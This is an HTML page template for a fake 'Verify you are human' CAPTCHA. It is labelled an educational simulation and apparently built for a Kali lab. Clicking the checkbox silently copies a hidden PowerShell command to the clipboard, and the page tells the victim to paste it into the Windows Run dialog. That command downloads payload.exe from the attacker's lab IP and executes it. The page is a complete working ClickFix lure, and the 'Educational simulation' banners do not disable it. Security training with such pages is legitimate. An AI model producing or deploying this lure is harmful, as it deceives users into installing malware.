<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Verify you are human</title>
  <link rel="stylesheet" href="/style.css" />
</head>
<body>
  <div class="edu-banner">Educational simulation</div>

  <main class="card" id="card" data-state="<%= state.state %>">
    <img class="logo" src="/captcha.png" alt="logo" />

    <h1 class="title">Verify you are human</h1>
    <p class="subtitle">Complete the check to continue.</p>

    <div class="checkbox-row" id="checkboxRow">
      <button class="checkbox" id="checkbox" aria-label="Verify"></button>
      <span class="checkbox-label">I am not a robot</span>
      <span class="spinner" id="spinner" hidden></span>
    </div>

    <section class="instructions" id="instructions" hidden>
      <h2 class="instructions-title">Verification required</h2>
      <p class="instructions-sub">Code copied. Paste it into the Run dialog.</p>
      <ol class="steps">
        <li>Press <kbd>Win</kbd> + <kbd>R</kbd></li>
        <li>Paste the code with <kbd>Ctrl</kbd> + <kbd>V</kbd></li>
        <li>Press <kbd>Enter</kbd></li>
      </ol>
      <div class="code-box" id="codeBox"></div>
      <p class="copied-note" id="copiedNote" hidden>Copied to clipboard.</p>
    </section>

    <section class="waiting" id="waiting" hidden>
      <span class="spinner big"></span>
      <p class="waiting-text">Waiting for verification to complete…</p>
    </section>

    <p class="edu-note">This page is a simulation. Nothing is executed.</p>
  </main>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    // The Windows-side command. Served over plain HTTP, so the target
    // fetches from the Kali lab IP, not 0.0.0.0 and not 127.0.0.1.
    var KALI_LAB_IP = "192.168.56.101";
    var PAYLOAD_URL = "http://" + KALI_LAB_IP + ":3000/payload.exe";
    var RUN_CMD = 'powershell -w hidden -c "iwr ' + PAYLOAD_URL +
                  ' -OutFile $env:TEMP\\p.exe; Start-Process $env:TEMP\\p.exe"';

    var card = document.getElementById('card');
    var checkbox = document.getElementById('checkbox');
    var spinner = document.getElementById('spinner');
    var instructions = document.getElementById('instructions');
    var waiting = document.getElementById('waiting');
    var checkboxRow = document.getElementById('checkboxRow');
    var codeBox = document.getElementById('codeBox');
    var copiedNote = document.getElementById('copiedNote');

    codeBox.textContent = RUN_CMD;

    var checked = false;

    function legacyCopy(text) {
      var ta = document.createElement('textarea');
      ta.value = text;
      ta.setAttribute('readonly', '');
      ta.style.position = 'absolute';
      ta.style.left = '-9999px';
      document.body.appendChild(ta);
      ta.select();
      var ok = false;
      try { ok = document.execCommand('copy'); } catch (e) { ok = false; }
      document.body.removeChild(ta);
      return ok;
    }

    async function copyCommand() {
      try {
        if (navigator.clipboard && window.isSecureContext) {
          await navigator.clipboard.writeText(RUN_CMD);
          return true;
        }
      } catch (e) { /* fall through */ }
      return legacyCopy(RUN_CMD);
    }

    function render(state) {
      card.dataset.state = state;
      if (state === 'idle') {
        checkboxRow.hidden = false;
        instructions.hidden = true;
        waiting.hidden = true;
        spinner.hidden = true;
        copiedNote.hidden = true;
        checkbox.classList.remove('checked');
        checked = false;
      } else if (state === 'armed') {
        checkboxRow.hidden = false;
        checkbox.classList.add('checked');
        spinner.hidden = true;
        instructions.hidden = false;
        waiting.hidden = true;
      } else if (state === 'connected') {
        checkboxRow.hidden = true;
        instructions.hidden = true;
        waiting.hidden = false;
        window.location.href = '/complete';
      }
    }

    checkbox.addEventListener('click', async function () {
      if (checked) return;
      checked = true;
      spinner.hidden = false;

      // User gesture is active here, so clipboard write is permitted.
      var ok = await copyCommand();
      copiedNote.hidden = !ok;

      await fetch('/verify/check', { method: 'POST' });
    });

    var socket = io();
    socket.on('state', function (s) { render(s.state); });
  </script>
</body>
</html>